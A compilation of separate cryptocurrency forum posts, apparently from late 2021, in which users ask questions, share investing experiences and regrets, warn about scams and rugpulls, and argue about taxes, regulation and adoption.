Blockchain technology is obvious extremely versatile with NFTs, DeFi, play to earn gaming and endless other use cases.  I am looking for a breakdown/matrix detailing which chains are projected to be the big players for the various respective use cases (Eth, Dot, Hbar, Cardano, Solana, Avalanche, .....).  ETH for example has a strong track record of reliability which is huge but the gas fees are too high for retail consumers to interact with on a regular basis IMO.  So maybe ETH will be a strong player with institutions but not the gaming sector?

First, lets define what a religion is: *Religion is a social-cultural system of designated behaviors and practices, morals, beliefs, worldviews, texts, sanctified places, prophecies, ethics, or organizations, that relates humanity to supernatural, transcendental, and spiritual elements, the belief in and worship of a superhuman controlling power, especially a personal God or gods*

Expanding on this: *a particular system of faith and worship, or a pursuit or interest to which someone ascribes supreme importance*

How does Crypto fit into this description? 

Crypto has become a social-cultural system with specific behaviors and patterns, such as checking charts, researching new coins, talking about said coins, etc. 

It holds its own set of unofficial morals and ethics, such as dyor, hodling, gains and profits are acceptable despite generally being generated directly by losses of others, etc. 

It has texts which have evolved to be view as somewhat sacred, such as the original Bitcoin white paper or the charts that we view daily. 

It comes with a system of belief, whether of potential gains or of the power to change the worlds financial systems and deficits. 

It has prophecies, false prophets, organizations and dedicated individuals all trying to convert others to the system, be they youtubers, influencers, news articles, celebrities, or coin creators. 

It could be argued to relate humanity to a supernatural power of the power of the blockchain, although Id argue blockchain technology is fundamentally natural as it was created by natural organisms (humans) with natural materials. No otherworldly beings bestowed us with this tech unless we genuinely believe Satoshi is a god of some kind. Though his mystique has given him some of the elements of a notorious fairytale supernatural creator. There is a kind of worship of him and his creation. 

There is also a worship of crypto, regularly checking in to see how its performing. It even has elements of sacrificial belief that surrendering fiat into it may grant a better life down the road. 

It is somewhat intangible, unseen to the layman, with the faith of each user keeping it in existence. 

Perhaps we are members of a new religion, called cryptocurrency, and maybe, like every religion before it, blind faith in something is radically dangerous and exposes us to oppression by holders of the sacred texts, or coins, moving us to act on their behalf and not our own despite or beliefs tellling us otherwise. Perhaps it is a dangerous one, that will lay waste to antiquated power structures and pave the way to something we arent prepared for.

Perhaps Im wrong, Id love to know. As an anti theist it does make me nervous. But Im still hodling, and I still have faith that moons are just around the corner. Lmk

Okay someone recently posted about their first moonies, their words not mine, and someone else said that moons will one day be their ticket off the planet. 

I know were trying to colonize Mars, but why not the moon first. Logistically its a lot closer and crypto would be a decentralized currency available via deep satellite. No need for heavy, physical money or brick and mortar banks.

This quite literally involves rocket science, so I might be missing a few steps here, butyou know.

(The rest of this is mostly filler to reach the 500 minimum so its off topic. The Mets verse has me excited about actually usable and collectible NFTs, not the over hyped stuff thats being peddled now but the digital tokens of actual value. I liked Ready Player One and having gaming items that are permanently tethered to your account despite where you travel on the meta verse is a pretty cool idea. Definitely keep an eye out for those meta tokens.)

What have you learned since you started investing in crypto? I've seen a bunch of posts about dca, buying the dip, etc. but I'm looking for the slightly less common lessons/tips we've picked up along the way.
An old lesson that got hammered home in a big way for me is to sell when clueless people start talking about an asset. This Monday at the gym I overheard a couple elderly guys talking about purchasing "that Shiba thing." My immediate thought was definitely stay away from that shit. 
What other important lessons can you share?

So, i participate to the governance but i'm really new to this, and i'm trying to understand all the numbers and i need help.

[Here, is the page of algorand foundation on governance reward.](https://algorand.foundation/governance/first-period-rewards/)

If i understand correctly, the reward is calculated for all the first governance period, from 1 october 21 to 31 december 21, so 3 month.

Based on their  diagram, the reward can be from 12% to 30% annualy.

&amp;#x200B;

https://preview.redd.it/h7dlu0kkrox71.jpg?width=1209&amp;format=pjpg&amp;auto=webp&amp;s=5e1a76388f004e3c4401948534c785d164e4d538

I will take a example :

&amp;#x200B;

if i have 100 Algo in my wallet, from 1 october till 31 december, and the reward calculated are 18%.

My reward, the 31 december will be 18%/4 = 4.5% for 3 month = 4.5 algo ?

Is that true ?

Thx !

I'm currently an user. Not going to lie, more than the privacy part, I joined for the Basic Atention Token (BAT) and while I'm aware Im not going to get rich or anything (specially because the adds campaigns in my country arent that great) but it's still nice. Specially because besides different rewards and stuff you can use your BAT for, besides the typical trades



Obviously, beyond that the browser it's quite nice. It's quite cool the integrated -configurate- shields to block sites adds, tracking, invasive cookies, etc.



Only thing I dont like. Its the necesity of using Uphold to get the BATs (You can also currenty use Gemini, but isnt available in my country). Mainly because sometimes Brave and Uphold can get "weird" -to call it somehow- toward each other. Like the fact currently you can only connect 4 devices with Brave to your Uphold wallet... AND YOU CAN DELETE OLD ONES -at least not yet, though the removal tool is being developed.


So if you ever lose a device, or do something like changing your OS, or reinstalling Brave, it will count it as a new device, and if you reached your max, you wont be able to connect it.


Anyway, thats my opinion as an user -not an expert, let me clear- with Brave.

Hi all. I'm an aspiring NFT artist and I want to brush up on my skills a bit by looking for prompts to remove the good ol artist block. Anyway, I discovered the APENFT Foundation and apparently it has a $100M fund called [the Art Dream Fund](https://artreview.com/apenft-foundation-open-call-for-digital-creators-art-dream-fund/) that wants to promote crypto + art + finance. TLDR they want to give grants to NFT artists and invest in NFT projects.

Anyway, I'm thinking of submitting here just to get a bit of exposure and the theme interests me (it's "Second Life in the metaverse" LOL).

What kinda worries me is that artists in twitter already tell other artists to avoid submitting art in contests because the contest creators might end up owning their artwork. I'm not sure if the case is the same here since we deal with NFTs, or if it's even worth bothering with these art funds anyway. 

I'm not sure if the sub has had any history dealing with these kinds of things. Are they worth it? Thanks

So I've bought crypto off and on over the years, mostly through coinbase pro. I have some bucks to fuck around and learn more maybe I lose, maybe I don't, but I learn by doing so time to spend money on some alt and shit coins. 

What I'm trying to figure out is where this comes in, with coinbase I can't get in on a lot of the coins, nor can I stake much other than eth2. 

My general understanding is buy tokens that are pegged to the dollar like thether, then move them to trustwallet as a software wallet and then connect to pancakeswap to buy some of these other coins or other coins to stake. 

&amp;#x200B;

I'm looking at hardware wallets to add a level of security, currently looking at ledger nano x, the trezor model T, or maybe hold out for the new ngrave zero. 

&amp;#x200B;

I'm at that point where it is time to take the next step in my crypto education, but I'm getting lost in the massive amount of youtube video link spam, and outdated content. I've learned a lot on this sub, there are also a lot of differing opinions.

&amp;#x200B;

I may not be very clear on this so if you have other questions, let me know and I'll do my best to reply.

Some days ago I posted here about various difficulties I had with Mycointainer.  I thought it only fair that I follow up on my complaints.

First off, the missing ADA is now credited to the account after, and only after I contacted support, outside of the app from my email account.

I had tried to use their automated system of requesting a credit for missing deposits but neither venue/method listed on the website/app worked or were responded to.

Customer support tells me that there are actual live links to the contact support button on the website/app but I found and find this to be not true.  I am using the Brave Browser so perhaps it doesn't work on Brave alone, but I doubt it.

The mobile app for ios is completely messed up and customer support informed me the organization is aware that it is shite.

The interface for signing up for their power rewards subscription is also shite and remains crap.

I will do another update on MyCointainer in a few weeks or months as I learn more about the service.

Ive been thinking lately, what does mass adoption really look like in coming years? With the massive momentum crypto has been getting in the last few months and even more individuals opting for [crypto](https://www.cbsnews.com/news/eric-adams-mayor-paycheck-bitcoin-cryptocurrency/) paychecks, how do we see this developing? 

I personally see one avenue being a paycheck conglomerate like  allowing for everyday works opt in for a pro crypto feature allowing for portions of a paycheck to be committed to a crypto. What other ways do we as a community see adoption going mainstream? [ADP](https://www.adp.com/spark/articles/2018/03/transaction-technology-hr-and-the-blockchain-benefit.aspx)

What is one project you wish you knew about earlier or had invested in earlier.
For me personally its algo or cosmos, main reason being the huge chance (in my opinion at least) for algo to hit 5 dollars and cosmos to hit 100 andthw other reason STAKING, the staking lets me actually make "passive income" thats higher then the inflation rate of my nation unlike a fiat bank account that has suck a ridiculously low interest rate
Im curious to hear the projects you wish you knew about earlier and the reason behind them.

Apologies in advance for the incoming wall of text, I'll do my best to make a good TL:DR.  
Over the past \~year I've begun having a change of heart about cryptocurrency in general. The weird part is, it wasn't really anything that happened in the crypto world that did this; it was actually because of the finance/banking industry. I'm not going to go on a diatribe about rampant inflation and shady practices on Wall Street as that horse is already very dead and requires no further beating. Instead, the point I'll bring up is the ability of payment processors and banks to gatekeep businesses from the internet. We saw it earlier this year with Onlyfans almost going the way of Tumblr with a porn ban based on pressure from their payment partners. Something similar happened to Pornhub last year with major credit card companies disallowing payments to Pornhub's owner, Mindgeek. And it's not only porn companies having issues, it's any "risky" industry like gambling, alcohol, marijuana, and lending/banking. Payment processors have the ability to control what businesses can accept payments on the internet, effectively gatekeeping what is allowed to thrive.  


So, what does this have to do with crypto? A decentralized system can escape the oppressive control that payment processors have on the internet by making it possible for everyone to essentially control their own payment processing. Granted, wallets could possibly implement ways to try and become the new gatekeepers, but 1) I don't see that being a popular idea and 2) there are plenty of wallets to compete with that would love to take your risky gambling/porn/whatever money.  


Now, why am I still skeptical? I want to be very clear: I hate the CURRENT state of crypto, but I am very interested in its possible futures. Right now, the biggest problems I see can be summed up as:  


1. There are many, many more people getting in to cryptocurrency to get rich quick or for trading/investing/HODLing than there are actually using it for any purpose as a currency. Simply as a store of value, cryptocurrency does nothing to address the problems that I think it both can and should. Also, this attitude of buying crypto to get rich leads to the scam stories that we hear every day (looking at you, Squid Games) and pushes it ever further from widespread adoption.
2. The environmental impact of PoW right now is just absurd. Bitcoin maxis like to point out that the entire Bitcoin ecosystem uses less than half of the power of the traditional banking system while forgetting (or ignoring) that Bitcoin processes a fraction of a fraction of a fraction of the transactions that banks do. Crypto needs a better way to go forward without consuming exponentially more and more electricity.
3. PoS sounds like a decent solution to the energy usage concern of PoW, but my biggest problem is that it just seems like another system where the rich get richer just by virtue of already having the money to stake. Granted, PoW has this same problem with the computational arms race is creates, but PoS does nothing to fix this. Growing inequality is one of the largest problems the developed world is facing today, and any cryptocurrency implementation is going to have to at least think about this. I wish I had a solution to this, but frankly it's a complex problem for people far smarter than me. 
4. The cryptocurrency ecosystem feels like it is ignoring all the lessons learned in relation to banking/monetary policy/economics of the past few centuries. We have a mix of hyper-inflationary coins being held up by hype cycles, and coins with built-in deflation which is touted as a feature instead of being recognized as a massive liquidity problem. This is a big one for me, because it reminds me of problems I see all the time in my line of work. As a software engineer, a lot of us feel like any problem we encounter we need to solve with code. It feels to me like this is exactly what is happening, where we have some unarguably brilliant programmers making decisions far outside of their wheelhouse without consulting people that could be helping them towards a common goal. 

I think I have rambled enough here. I wanted to see if there was anyone else that had similar thoughts to me here. Alternatively, you can yell at me and tell me why I'm wrong. Either way, I'd love to hear your input.  


TL:DR - Crypto has a few key problems that it needs to address sooner rather than later, but the current state of the baking system and payment processors has created a golden opportunity to address these issues and bring new people in to the ecosystem.

I can (and have) watch hundreds or thousands of dollars vanish away in a matter of hours or days without it phasing me, but spending $10 on something trivial is something I give a great deal of thought to. 

I can refresh the charts and be $20 poorer in a second, but spending that same $20 for a good or service is something I have to deliberate for at least a few minutes to decide if its worth it. 

I dont know if Ive yet found the relevance of this psychologically, beyond the interesting dichotomy of faith I hold in crypto for potential gains versus the lack of faith I hold in virtually everything else. This weighs on me heavily sometimes. Faith in numbers for the potential of a better life down the way, against the faith that a purchase for something that will tangibly make life easier in the present. 

Empty philosophy and ramblings I havent thought through completely without a punchline surely make for even emptier posts. Anyway

He has coinbase and I have coinbase. Should I just buy $50 worth of BTC on the first of every month, through coinbase,  and then immediately send it to his wallet? He wants to HODL forever, so Im just going to continually send the $50 to the same address every month for literal years. 

Hes a crypto noob and coinbase is easiest for him. Im also a crypto noob and coinbase is easy for me too. Very user friendly for us. Is it okay if we just stick with that? I buy the $50 of BTC through them and then just send it to him immediately?

Hey guys, I'm curious about what the dumbest thing anyone has ever said to you regarding cryptocurrency. I've had some doozies although I steer clear of this topic when talking to people who I know are going to have some wacky takes: which is most people. 

I've had someone tell me it's not real money because they can't hold it and it's purely digital. Which is funny because most of the money that we use comes from a plastic card. He rebuttled and said that it's real if we want to withdraw it, but then I said that if we all tried to withdraw our money there wouldn't be enough physical cash for everyone to hold.

We started getting away from the actual topic, but he was trying to tell me that just because something is not tangible means it cannot be real. I'm pretty sure you could pick countless examples of things that are real that you cannot actually grasp physically. 

To be fair, the bloke may live in a completely concrete life where abstract terms and concepts do not exist.

Anyways, what is the dumbest thing someone has said to you about this technology?

Hi everyone. In accordance with the post title, anyone use bitnarick.com to buy/hold cryptocurrency?

I supposedly got a bonus for making an account, but to transfer out my bitcoins I am required to confirm my account, which requires a deposit of at least 0.01 Bitcoin. Im wondering if its just a way to lose $600 (I make the deposit, I found out theres no bonus, and then my deposit is gone).  I searched the internet, but didnt find anything about it one way or the other. Hoping someone here has some guest or second hand experience. 

Thanks in advance!

Basically the title. I had a small but not insignificant amount of crypto that I left in the mining pool. Life and general laziness always got in the way of me transferring my earnings out.

Now I go to transfer my holdings out and I'm being told that they have a backlog of withdrawals that's 200k deep. I can't get a straight answer as to how long it will take to get my assets. 

This is starting to smell like they can't cover their obligations, and what's worse, the pool shut down. I'm hoping for the best but at this point it looks like I'm SOL.

TL;DR: Don't leave mining rewards with the pool.

I have questions and would appreciate feedback. I am working on a project that will walk students through different economic models and want to have, as part of the project, the students creating their own cryptocurrency.

I understand several places make it quite easy but one model that I am specifically wondering about is Universal Basic Income (UBI) and cryptocurrency.

Are the available designs of cryptocurrency creation platforms able to support the idea of a UBI?

As one of the possible experiments of the currencies, but specifically the cryptocurrency, is it possible to destroy coins that aren't moving?

Thank you for your time with these questions. If I should be posting elsewhere, please let me know.

Thanks again!

This is a heads-up t those that do not know. Coinbase Pro should be paired with the base app Coinbase. The fees you have to go through for the Coinbase app are quite high compared to that of Coinbase pro. Unlike the Binance app, those 2 apps are separated. So if you want to use them both you will need to download both of them to your device.

Coinbase Pro has a much lower fee and it is a free app of its own. There is no reason not to switch over if you are using the base app "Coinbase". I do understand that the Pro version looks more intimidating as there are more options and technical aspects that are not existing on the base app.

Here are some great plus when it comes to the base app. The short and simple answer is staking and security. Therefore, I recommend buying and selling through the Pro version and keeping the cryptos in the base version.

Hopefully, this has been useful for you lads :)

I feel like u/Yeetasaurus1979 meant well but missed an important point with his popular [This isnt the space for your libertarian rants about how the government isnt allowed to tax you.](https://www.reddit.com/r/CryptoCurrency/comments/qmrys0/this_isnt_the_space_for_your_libertarian_rants/) But I think he missed some important points.

&amp;#x200B;

The very first block mined by Satoshi back in 2009 had the following heading:  

&gt;"The Times 03/Jan/2009 Chancellor on brink of second bailout for banks. 

&amp;#x200B;

In the wake of the 2008 financial, the message that the government was doing the people dirty was somewhat clear. Banks responsible for selling subprime mortgages, sold the risk to Wall Street who, in turn, dumped the risk back on the people through shit Mortgage backed securities. When things went south, people with adjustable rate mortgages lost their homes, pension funds lost money because they used to buy "low risk" MBS sold by wall street and the economy tanked, along with millions of blue-collar jobs. Meanwhile, the government injected huge amounts of money to save the very institutions that caused the entire debacle, and it did so with money of the average taxpayer; the very people that suffered the most.

Though, contrary to popular belief, Bitcoin was *not* a response to the financial 2008 crisis (Satoshi had been working on it before the crash), it is pretty much well accepted that it the crisis helped to drive the point home, and the header on BTC's genesis block illustrates just that.

It is also telling that, during BTC's early days, that strange new technology was a hot topic among two main communities: the cryptography community and the libertarian community. Libertarians were some of those who saw the potential of having a currency that could escape mismanagement by politicians and central banks and, yes, evade the IRS. I was a libertarian back then (my views have changed since) and I remember vividly the discussions about bitcoin as early as 2010 (unfortunately, I didn't buy any). It was adoption by libertarians ranting about how taxes are theft that helped give BTC its very first baby steps.

The point is. I agree with u/Yeetasaurus1979: pay your taxes, keep track of your transactions and don't risk going to jail because of it and all of that. But don't forget that the government often takes your hard-earned money and spends in ways that are completely against your interests and well-being. So rant about it, pressure your representatives about it and always involve yourself in the fight against abusive and immoral government practices. Remember that this is one of the reasons crypto exists in the first place.

Hello! Iv been looking around on google for a few days now and Im not sure if there is a Dapp for this. Essentially what I am looking for is an app that would allow individuals to come together and put money in on something, and then the rewards earned would go  back based on the percentage you contributed. For example if I wanted to get into strong-nodes but I dont have 8-10k (rough estimate at the time of this post) and If there are other individuals who are thinking the same. We could each put some money in, that way we could start earning a percentage of the rewards. Does this make sense?

Rather you like it or not politics are going to have a HUGE roll in The future of all crypto, block chain, and decentralization. Theres no way around it, and if its not talked about the you are skewing yourself and everyone else!!

People need to grow up and have civil god damned conversations!!! Ive been in this subreddit for maybe 2 months and Ive talked to people on both side of the aisle and have been informed by them as well. All have been pleasant to deal with and have actually helped me learn a bit!

Rather you like politics or not doesnt matter because the politicians and the elite are going to stop the lid on this trap if you cant figure out how to communicate!!!

Who the hell is going to benefit from the regulations and who is going to have governance power over these systems? You can bet you ass and a shiny shitcoin its not gonna be you, me, or any other MF in this Sub.

Theres legislation lined up for the foreseeable future that if passed will strip you of personal property, turn this technology and ideas against you! A slave to the system youre helping to build right now!

Dont let the politics do what its designed to do

IT KEEPS YOU FIGHTING AND NOT PAYING ATTENTION TO LEGISLATION!!!

Either youll learn to be respectful of each other and talk shot out.and maybe just maybe by the longest shots you can prevent the raping of the human experience that is coming and is quite possible in this type of system


Its going bro be their rules and not your rules if this continues

I bought into squid token after the huge rugpull scam. not going to lie, I almost bought into it in the height of the original scam but it went so high, so fast I couldnt risk it (thank god)  


When the price shot down so immediately, i couldn't believe it, I've never seen that in my HUGE crypto career of 5 months, I was so curious about what happened. I'm an absolute beginner so I wanted to figure out how that could happen. I even tested buying newly formed cryptos just on the off chance that one may explode (really bad history experience) 100% of the time they just turn to dust,   


Turns out it's easy to turn your money into cryptodust.  


I went back into squid because (mostly curious) I was wondering what happens after a scam and rugpull. once that immediate threat left, once the scammers leave the room, what happens to that room?? what is left of the coin. especially a coin with such a huge advertisement in the crypto space.   


I bought $100 when it was 0.008 and wanted to see if I could sell. I found I could sell and learnt the rules had changed, so I bought in again and held.   


originally you could not sell squid and now it's changed,  now the scammers have left the game the rules changed  


 I haven't bought more into it, obviously I don't trust this coin too much but I'm up 6x and dont feel any need to sell right now  


As a bare ass newby in crypto I am ready for your condescension and wrath, and I totally deserve it. kisses xxx

If I hold, I might lose my gains when it dips at ATH. If I sell, I might not be able to buy in at a safe dip and it might just end up mooning before I can get onboard. What's the best thing to do here without all the paranoia and anxiety?

Dipped my feet in crypto a week ago. Been using tokensniffer to check out coins before I decide whether to invest money in them or not, especially after what happened with Squid Game. I still don't really understand what made a coin like Shiba Inu moon and then crash afterwards.

PLEASE try to refrain from shilling your coin. I want to hear what a realistic portfolio would look like with a goal of 100k from 10k so that is a 10x. 

Im interested in well balanced portfolios with a mix of high, mid, and low cap projects. Already have ETH and DOT. I have a lot of interest in the gaming NFT space which I think is pretty cool although a few years away from real major adoption. 

What would your balanced portfolio look like for realistic 10x gains by the end of the bull run? How much would you allocate to each project? OR what does your portfolio look like right now?

Hi everyone. Im a landlord with a few rental properties and I would like to consider accepting rent in the form of crypto. 
I have gotten into crypto this past year and have enjoyed learning about everything crypto. I would like to do my part for adoption so I am going to give my renters the option of paying with crypto.
Im curious what other landlords and businesses use to accomplish this. Do you guys use CoinBase Commerce or similar? Or do you just simply give them your wallet address?
Also what are your opinions on only accepting certain crypto like BTC, or do you accept any king of crypto?

I'm not sure how to take this. My local news just did a segment on squid game token and and crypto currency scams. But then went into talking to investors suggesting a allocation of longstanding cryptos from 1% to 5%. I've only been in the game since last april after procrastinating to long. Wish I would of jumped in earlier. Never to old I guess 38 and pipeline guy trying to retire. I got another co-worker hooked. Godspeed all you it's be interesting ride and i hope to take this all the way to the end with all of you.

IOTX was up nearly 250% today at a price of 40 cents and oh boy do i wish i hadnt sold mine at 0.08 cents. 
I missed out on some decent profits all because i was inpatient, dont be like me have patience in projects you really  believe in and youll be gifted with profits(hopefully)
I still did make a small profit when i sold at 0.08 cents but still i cant stop thinking about the profits i could have made had i waited a little longer.
If you guys have similar story's im curious to hear them

No one cares but it's important to me so i'll post it here. 
I'm kind of new to crypto and i'm not very comfortable with markets. I always wanted to invest in crypto but everytime i ended up walking away... First because i don't have money to put at risk and second because there are so many things i don't understand about crypto currencies and it makes me scared. I kept doing micro transactions and tests on different platforms since 2018. I keep telling myself with regrets that if i have had the balls to make an actual deposit back then and held it, today i would have made a lot of profit. 
Well... it's true. Ffs i put 10 on BTC and kept toying around with it!!! I should have put 100, the price went up by 10times, i should've least held it in place instead of selling/buying what the hell is wrong with me. 
Jokes apart i'm finally taking the leap, i just made a deposit of 100$ for crypto investment in kraken. It really isn't much but for me it's a big step. We'll see where it goes.
I'm open to any kind of advices

How much of your portfolio do you have in stable coins? 

Some of the interest rates Ive seen seem to good to be true. For example nexo advertises 12% apy, which is crazy. 

Am I missing something here or is everyone just enamoured with chasing 10x gains so these interest rates dont get talked about?

Gotta fill this character limit so heres another remind to open your vaults and collect your moons before they moon. Moon to the moon, moon to the moon, moon to the moon! Blah blah blah blah blah

I was wondering how one goes about reporting to the IRS gains and losses that are accrued on exchanges that are accessed through a VPN from the U.S.? 

Being that one is not really supposed to use these exchanges in the first place, how does one go about reporting ones activities on them?

Does one simply download the transactions to a spreadsheet, transfer that information into a software program and then use that for reporting?

Has anyone who used a VPN to trade been audited and did they require you to tell them where you had been trading? 

If they made such demands where there any penalties assessed for operating on these exchanges?

Thank You

I was watching Gemini exchange today very closely for Smooth Love Potion SLPUSD. It seems as though the order book will add 20 million coins or 10% of total 24 hr market volume every-time the coin goes on a upward run of more than a few pennies per coin in less than hour or has a large gap between ask and bid. It than sells large quantities of the coin for far less than current market price. Who gains from this?  It cant be a coincidence it seems like it is programmed to do this. Any thoughts?  Right now 7:52pm central slp will jump to beyond .1042 quickly it currently selling .0947 @ 1.6 mil and has 10000 left to go.

Ive seen quite a few posts recently that have been politics based. Dont get me wrong politics is an integral part of the conversation on this sub but when I start seeing shit posts calling libertarian bros out about taxation and others calling people whining Democrats it makes me sad to see that were delving into the same politics based nonsense I see on every other sub *cough* r/politics *cough* which is divisive and pits people against each other. I think what I love about this sub is the overall spirit of comradery. So could we put aside our political differences and get along.. I mean, at least until we get mass adoption. Love you all

Back in early 2021 with the rise of the shitcoins I decided to invest a bit in it for fun.

Ive invested in about 50 shitcoins (between $1 and $5 each, goal was to learn more about them rather than make bank).

Chapter 1: Where to find my shitcoins.

For each shitcoin I decided to invest in I first took a loot at Token Sniffers newly added list.

Chapter 2: How to decide to invest or not.

From Token Sniffers site, take a quick look at the contract (Im not an expert at all and I mostly dont understand whats in there, was mostly checking for big red flags such as this is a community driven token).
Check the websites summary for the token (similar contract, liquidity, creator wallet etc).

Then check the BscScans page to see if 1 or more holders where owning the majority or the supply or not, number of holders and a quick look at the transactions (early splits between wallets, possibility to sell etc.).

Next step was checking Mudra Managers website (now you need to have a account to see the locked liquidity and stuff which wasnt the case few months ago). 

Following a quick look at BScheck and RugDoc websites.

And finally a quick google search to see if the token was mentioned somewhere (SNS &amp; co). 

Chapter 3: The after match.

Now it has been more than 6 months since I invested in these 50ish tokens.

The majority of them have been rugged pulled or died before even starting.

The best Ive seen was a x15 increase before been rugged. (Generally rugged after a x5 / x10)*
* the x factor is based on MY initial investment, scammers probably rugged at a higher factor. 

Out of the still alive tokens, none is in profit. 

As my goal was not to make bank but learn about these coins I did not sell a single token, but I believe I could have make a small overall profit by selling quick after buying as usually the first few days were between x3 and x5. 


Note this story was about investment in really early shitcoins, Ive also invested in a couple of shitcoin once they started to gain popularity but that story will be for another time.

TLDR: in early 2021 I invested few bucks in really early tokens using Token Sniffers newly added page. 6+ months later none is in profit, best seen was x15, most have been rugged pulled after a x5/x10 increase.

To start, I'm not one of those Shiba believers.  It's another opportunity, but that's it.  I am more of an ALGO guy, tbh.

I have been hearing about Shiba for some time.  I never really considered it because I didn't think lightning could strike twice (Doge blew up and I couldn't see that happening to Shiba).  Then I got an email from Coinbase saying they were now offering Shiba, only Coinbase was telling me (and still is to this day) that Shiba isn't offered on CB.  I know this isn't true, but I get that error.

So I switched to my back-up exchange, Voyager.  I know plenty of people don't like the app, but I had $358 for free in BTC.  I sold my BTC positions and put all of it on Shiba at $0.00000757.

A month later Shiba went up drastically and my $350 turned into $3500.  It's back down a little and I believe it will do what most mainstream Cryptos are doing, up and down highs and lows.  But I will not sell any until I have $10k.  That's my goal.  If it goes to $0 or to $1Mil it's all the same to me.  It was free money anyway.

I don't know if I would have gotten into Shiba with money I earned through my job.  But I'm glad this all worked out this way.

And if anyone has questions about Voyager, feel free to reach out.

A few years ago, I had a friend recommend I invest in BNB. This was at the peak of the last bull run in January of 2018, and BNB was only about $20. Fast forward a few years, and now its $500+. And of course, I didnt invest at the time, and Im kicking myself for that. I dont even remember r/cc promoting BNB that much back then, although its possible I just missed it. 

Anyway, if you look at [The Coin Perspective](https://thecoinperspective.com/compare/crypto-com-chain?vs=binancecoin), it says that CRO has a market cap of $7.3B and BNB has a market cap of $94.3B. If CRO caught up to BNB, it would 12X and go from its current price of $0.29 to a new price of $3.73. ([Pic for reference](https://imgur.com/a/NkrRRSo)).

So what would need to happen for CRO to grow that much? Is it really just having more people download the Cropto.com app? And is there anything special about BNB on a fundamental tech level that CRO doesnt have? And while we're at it, what exactly made BNB have such an astronomical increase in price in the first place?

Im feeling bullish on CRO, since I see it as my chance to make up for missing out on BNB. But I want to know how realistic I should be about growth potential. What do you think?

Just doing some reading about what I'm sure we all know by rote that *Bitcoin* inventor Satoshi Nakamoto capped the number of *bitcoin* at 21 million, meaning there will only ever be 21 million *bitcoins* in existence. 

My question is which of the coins that we're talking about have a hard cap limited supply or limited release? I know BNB and Algo I think? Any of the smaller altcoins have the same thing going?

And if the crypto you love doesn't have a limit, then how do you think your crypto is going to get around some version of "inflation" / "printing more money"?

Don't get me wrong. There is all sorts of wholesome ladies and gentlemen out here chatting around, giving solid, well thought advice. 

Then, there is the gut team. Swimming around in the thread like some hungry sharks. On a wild hunt with the smell of blood. 

Once in a while, I see a great question that I might want the answer to as well. Then outta nowhere, username: animejohnshredface(fake name, I think) busts through to hack the whole squad below the knees. There are little fractions of DOGE coin flying everywhere like shrapnel after he sets the chatroom ablaze. 

This post isn't meant to demonize the demons. I only mean to poke yall from the distance with a stick. I'm chucking rocks at the beehive to see what happens. Afterall, bees are pretty fuckin cool if you get a close look, but shit... I might be allergic to bees. 

Obviously I am a low level enemy, with little experience out here in your world. I'm worth barely any points.

Anyways, what I am trying to get at; Does anyone know of any cool places to earn NFT's? I read about FUFU, but I am looking for more variety/less anime inspired to burn some time with. 

Thanks.

You don't ask the pedophile offender to take care of your kids.

The reason cryptocurrencies were created in the first place was to take "the kids away from the pedophile" the money away from the state.

If Crypto becomes regulated it has failed its purpose.

Just look what your regulators "pedophiles" want to do with your money "kids" on this twitter thread.

[https://twitter.com/duganist/status/1456228685137260558](https://twitter.com/duganist/status/1456228685137260558)

And btwm they want to implement unrealized capital gains, "gains" which btw they are going to cause by inflating the currency causing everything you own to shoot up in dollars terms, and taxing those "gains" caused by them. 

"Unrealized capital gains" more like "legalized theft".

A few days ago, I reached a Reddit milestone I never thought I would: the exclusive lurker I used to be a few months ago just reached 10,000 karma. Crazy

Thanks to Moons, I started to interact more and more by commenting a lot and also posting from time to time here. That allowed me to get a good stash of magic internet points and dopamine even when my investment was tanked to the ground after May crash.

But whats more? I also started to do the same on many other subreddits! Even without the incentive I became more engaged with Reddit.

Some may say  have a negative impact on our community but not only. It also feels wonderful to be rewarded for engaging in the community and can have other unexpected positive impacts.

Thank you for implementing it.

I hope this community points system get generalized to the whole Reddit. (My personal wish is to collect Lembas on LOTRs subreddits)

Hi all

I've recently invested in SteamX or SteamExchange tokens on Poocoin. I understand from the SteamExchange Whitepaper on their website that the Steam Exchange tokens can or will be swapped for their own native coins on their own blockchain on their own exchange when it's all set up early next year. 
I have no idea what the rate of exchange will be between the tokens available now which I have millions of and native coin when it gets released and I'm worried the "devil is in the detail". 
Is any familiar with SteamExchange?
Is this whole thing too good to be true? 
How long would it take to create all of that? 
What does a centralised crypto exchange really mean?
Will my tokens be worth anything?

Any detail on my questions or advice or opinions on SteamExchange would be most appreciated

Hello! As the title states Im new to cryptocurrency and to this community. Ive read the FAQ section etc and found it very helpful. However, I have some very specific questions on wallets so I come to you with hopes of finally being able to understand how wallets work. 

I know they are places to securely store crypto. I understand that there are 2 types of wallets. What Im not clear on is what happens to the crypto stored in a wallet. 

For example, I have ETH staked in preparation for ETH2. If I move these shares to a wallet do they quit earning interest?

Second question is if I put any crypto into a wallet would I have to pull it out of wallet to do something else with it?

I apologize if this doesnt make much sense and thank you in advance for your input

Hey guys

I have bought a token which is not showing in my wallet and even can not be traded (swaps do also not see I have any of these tokens when connecting my wallet - tried it with pancake swap and directly on dextools).

Of course I added the costum token with it's contract address and also checked the contract on bscscan where I can see the transaction and my wallet listed as one of the holders with the amount I bought. The transaction of course went trough successfully and I can see that some BNB left so my wallet for this transaction.

Do you guys know why this is happening and what I can do to actual be able to use the token and see it in the exchange for selling etc.?

Usually I add coins manually and everything works alright but now I'm pretty confused as bscscan shows me as a holder but still I don't get it to work.

Thanks guys!

Hi can we start a conversation about how we can get Shiba coin to $.01? Ive been looking into Shiba for a few months now and wonder how we can get it to the $.01 thresh hold. I think if we get enough average people to invest we can make it happen! Any interested? If so can someone explain how the crypto works and why it can help us all in the long run. Bringing people together is part of the plan we need to get together and make a change for the better. Shiba and ETH is the best way! All of the creators of crypto so far have gotten filthy rich which is why Im making this post. 

We can make the change for ourselves lets get together 100k or more and we each put $300 and we can make a change! Who is with me? Can I count on the Shiba army to make a stand? 

I think if this post goes viral we can do it! Now lets make a change and take Shiba to the moon!

Soooo I have ADHD and it makes it tough as a crypto gambler because I cant wait. The best thing that ever happened for my portfolio was Coinbase locking my ETH up staking it. 

VET, ALGO, whatever is the flavor of the day I move money around but my ETH keeps doing well. 

So with that said I want to put $50 into this subreddit and take the stress off myself. I have $50 usd in KuCoin just wanting me to yolo into whatever. No. I suck. So starting tonight the first person to comment in a coin on KuCoin I will put that money into it. 

Lets gooooooo!  Nov. 4 the coin is?

***"Alright, haha, yes this sub is %99*** **proud Americans**, **very funny..."**

Ok, did they leave? Perfect!

So, my question is: "How does people react to Crypto, in **your** country?"

&amp;#x200B;

